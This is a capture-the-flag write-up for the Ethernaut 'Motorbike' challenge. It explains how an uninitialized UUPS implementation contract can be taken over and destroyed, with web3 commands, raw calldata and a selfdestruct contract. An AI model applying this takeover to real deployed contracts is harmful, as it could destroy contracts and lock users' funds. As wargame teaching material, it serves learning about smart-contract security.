# Ethernaut Challenge 25: Motorbike

The contracts given are a proxy contract and an implementation contract using the Universal Upgradeable Proxy Standard (UUPS). The UUPS is an upgradeable contract implementation wherein
the function that updates the implementation contract address is on the implementation contract.

The exploit in this case is that the initialization caller from the proxy contract that triggers the initialization function in the implementation contract is called with a delegate call. The initialization function makes the msg.sender the admin of the implementation contract. As a safe guard from anyone calling the initialization function to change the admin, the implementation contract has an "initialized" boolean variable that prevents the function from being called again. However, since delegate call is used in the constructor of the proxy contract, the storage context of that contract is used instead of implementation's. So then the "initialized" boolean on the implementation contract isn't set yet and can be called again and set our address as the admin.

With us as the admin, a function named upgradeToAndCall can be called to replace the contract's address to our own contract's address. The contract would have the self destruct function to break the implementation contract.

## Step 1:

Get the address of the implementation contract from the proxy contract at the implementation address storage slot as defined by EIP-1967.
`await web3.eth.getStorageAt(contract.address,'0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')`

## Step 2:

Call the initialization function (8129fc1c) of the implementation contract. This would set the admin of the contract to our address.
`await web3.eth.sendTransaction({from:'0xE93D3574F293919b290072554699C33f8D717150',to:'0xbe5c5676eb136f0b842bc7c66a48ff8c82843f75',data:'0x8129fc1c'})`

## Step 3:

Deploy self destruct contract. This contract only has a function that calls selfdestruct. This will replace the current implementation contract and will be called immediately using the upgradeToAndCall function.

`contract Destruct{ function selfDestruct() external {selfdestruct(payable(msg.sender));}}`

## Step 4:

Call the upgradeToAndCall function (4f1ef286) of the implementation contract. This function takes the address of the replacement contract (0x447A30daa5c437cE00aCA4460424293670AF003C) and bytes to execute after replacing contract address in the implementation slot. In this case, we're passing the function signature of the selfDestruct function made earlier.
`await web3.eth.sendTransaction({from:'0xE93D3574F293919b290072554699C33f8D717150',to:'0xbe5c5676eb136f0b842bc7c66a48ff8c82843f75',data:'0x4f1ef286000000000000000000000000447A30daa5c437cE00aCA4460424293670AF003C000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000049cb8a26a00000000000000000000000000000000000000000000000000000000'})`
